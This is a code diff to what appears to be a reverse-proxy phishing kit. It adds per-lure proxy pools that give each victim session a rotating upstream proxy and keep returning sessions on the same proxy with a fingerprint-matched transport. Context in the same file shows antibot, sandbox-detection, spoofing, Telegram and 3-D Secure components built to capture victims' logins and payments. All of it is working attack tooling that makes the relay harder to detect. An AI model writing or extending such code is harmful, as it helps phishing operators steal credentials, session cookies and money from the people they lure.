@@ -106,6 +106,17 @@ type HttpProxy struct {
 	// transport matching the victim's User-Agent without recreating it.
 	utlsTransports    map[string]*http.Transport
 	utlsTransportsMtx sync.RWMutex
+
+	// proxyPools holds per-lure proxy pools. Each pool is shared across sessions
+	// created from the same lure and dispenses proxies in round-robin order.
+	proxyPools    map[string]*ProxyPool
+	proxyPoolsMtx sync.Mutex
+
+	// lureProxyTransports caches http.Transport instances keyed by proxy config
+	// and JA3 fingerprint. Multiple sessions sharing the same proxy reuse the
+	// same transport for connection pooling.
+	lureProxyTransports    map[string]*http.Transport
+	lureProxyTransportsMtx sync.RWMutex
 }
 
 func (p *HttpProxy) wildcardKey(plName, pattern string) string {
@@ -195,22 +206,24 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		wl:       wl,
 		telegram: NewTelegramBot(),
 
-		antibotEngine:     nil, // Will be initialized
-		captchaManager:    response.NewCaptchaManager(cfg.GetCaptchaConfig()),
-		spoofManager:      response.NewSpoofManager(cfg.GetAntibotConfig().SpoofUrl, cfg.GetSandboxDetectionConfig().HoneypotResponse),
-		polymorphicEngine: nil, // Will be initialized based on config
-		sessionFormatter:  NewSessionFormatter(),
-		threeDS:           nil, // initialized after telegram is configured
-		isRunning:         false,
-		last_sid:          0,
-		developer:         developer,
-		ip_whitelist:      make(map[string]int64),
-		ip_sids:           make(map[string]string),
-		sessions:          make(map[string]*Session),
-		sids:              make(map[string]int),
-		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
-		cookieName:        "", // Initialize to empty string, will be set below
-		utlsTransports:    make(map[string]*http.Transport),
+		antibotEngine:       nil, // Will be initialized
+		captchaManager:      response.NewCaptchaManager(cfg.GetCaptchaConfig()),
+		spoofManager:        response.NewSpoofManager(cfg.GetAntibotConfig().SpoofUrl, cfg.GetSandboxDetectionConfig().HoneypotResponse),
+		polymorphicEngine:   nil, // Will be initialized based on config
+		sessionFormatter:    NewSessionFormatter(),
+		threeDS:             nil, // initialized after telegram is configured
+		isRunning:           false,
+		last_sid:            0,
+		developer:           developer,
+		ip_whitelist:        make(map[string]int64),
+		ip_sids:             make(map[string]string),
+		sessions:            make(map[string]*Session),
+		sids:                make(map[string]int),
+		auto_filter_mimes:   []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
+		cookieName:          "", // Initialize to empty string, will be set below
+		utlsTransports:      make(map[string]*http.Transport),
+		proxyPools:          make(map[string]*ProxyPool),
+		lureProxyTransports: make(map[string]*http.Transport),
 	}
 
 	// Initialize cookie name from config or generate new one
@@ -614,6 +627,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							create_session = false
 							ps.SessionId = sc.Value
 							p.whitelistIP(remote_addr, ps.SessionId, pl.Name)
+
+							// bind existing session to its previously assigned proxy
+							p.session_mtx.Lock()
+							sess := p.sessions[sc.Value]
+							p.session_mtx.Unlock()
+							if sess != nil && sess.AssignedProxy != nil {
+								ctx.RoundTripper = p.getSessionRoundTripper(sess, req.UserAgent())
+								log.Debug("[%d] [%s] using assigned proxy %s", ps.Index, hiblue.Sprint(pl_name), proxyConfigKey(sess.AssignedProxy))
+							}
 						} else {
 							log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
 						}
@@ -703,6 +725,16 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 									session.RemoteAddr = remote_addr
 									session.UserAgent = req.Header.Get("User-Agent")
+
+									// assign a proxy from the lure's proxy pool in round-robin order
+									if pool := p.getProxyPool(l); pool != nil {
+										if pc := pool.Pick(); pc != nil {
+											session.AssignedProxy = pc
+											ctx.RoundTripper = p.getSessionRoundTripper(session, req.UserAgent())
+											log.Important("[%d] [%s] assigned proxy %s from lure pool", sid, hiblue.Sprint(pl_name), proxyConfigKey(pc))
+										}
+									}
+
 									session.RedirectURL = pl.RedirectUrl
 									if l.RedirectUrl != "" {
 										session.RedirectURL = l.RedirectUrl
